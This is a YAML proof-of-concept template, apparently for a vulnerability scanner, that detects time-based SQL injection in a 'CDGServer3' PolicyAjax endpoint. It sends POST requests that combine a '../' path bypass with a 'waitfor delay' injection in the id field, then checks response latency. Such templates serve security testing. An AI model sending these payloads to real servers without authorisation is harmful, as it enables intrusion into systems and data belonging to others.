name: poc-yaml-yisaitong-CDG-PolicyAjax-sql
transport: http


rules:
  r0:
    request:
      method: POST
      path: /CDGServer3/dojojs/../PolicyAjax
      headers:
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Content-Type: application/x-www-form-urlencoded
      body: command=selectOption&id=1';waitfor+delay+'0:0:6'--
    expression: response.latency >= 6000 && response.latency <= 7000
  r1:
    request:
      method: POST
      path: /CDGServer3/dojojs/../PolicyAjax
      headers:
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Content-Type: application/x-www-form-urlencoded
      body: command=selectOption&id=1';waitfor+delay+'0:0:10'--
    expression: response.latency >= 10000 && response.latency <= 11000

expression: r0() && r1()


detail:
  author: Superhero
  links:
    - https://blog.csdn.net/m0_60571842/article/details/141030113



